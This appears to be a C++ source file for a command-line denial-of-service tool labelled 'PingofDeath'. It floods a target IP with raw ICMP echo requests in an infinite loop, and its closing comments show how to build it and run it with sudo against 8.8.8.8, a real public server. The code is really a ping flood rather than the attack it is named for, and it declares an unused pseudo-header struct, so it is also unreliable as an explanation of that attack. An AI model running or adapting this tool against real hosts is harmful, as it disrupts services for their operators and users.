#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip_icmp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>

// ICMP Header
struct icmp_header {
    uint8_t type;
    uint8_t code;
    uint16_t checksum;
};

// Pseudo Header for ICMP
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t icmp_length;
};

// Calculate checksum
uint16_t calculate_checksum(uint16_t *data, int length) {
    uint32_t sum = 0;
    while (length > 1) {
        sum += *data++;
        length -= 2;
    }
    if (length) {
        sum += *(uint8_t *)data;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

// Create and send ICMP packet
void send_icmp_packet(const char* target_ip) {
    while (true)
    {
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sockfd < 0) {
            perror("Socket creation failed");
            exit(EXIT_FAILURE);
        }

        struct sockaddr_in dest_addr;
        memset(&dest_addr, 0, sizeof(dest_addr));
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_addr.s_addr = inet_addr(target_ip);

        // Create ICMP packet
        struct icmp_header icmp;
        icmp.type = 8; // ICMP Echo Request
        icmp.code = 0;
        icmp.checksum = 0;
        icmp.checksum = calculate_checksum(reinterpret_cast<uint16_t*>(&icmp), sizeof(icmp));

        // Send the packet
        if (sendto(sockfd, &icmp, sizeof(icmp), 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("Send failed");
            close(sockfd);
            exit(EXIT_FAILURE);
        }

        std::cout << "ICMP packet sent to " << target_ip << std::endl;

        close(sockfd);
    }
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <target_ip>" << std::endl;
        return EXIT_FAILURE;
    }

    const char* target_ip = argv[1];
    send_icmp_packet(target_ip);

    return EXIT_SUCCESS;
}
// g++ -o PingofDeath PingofDeath.cpp
// sudo ./PingofDeath 8.8.8.8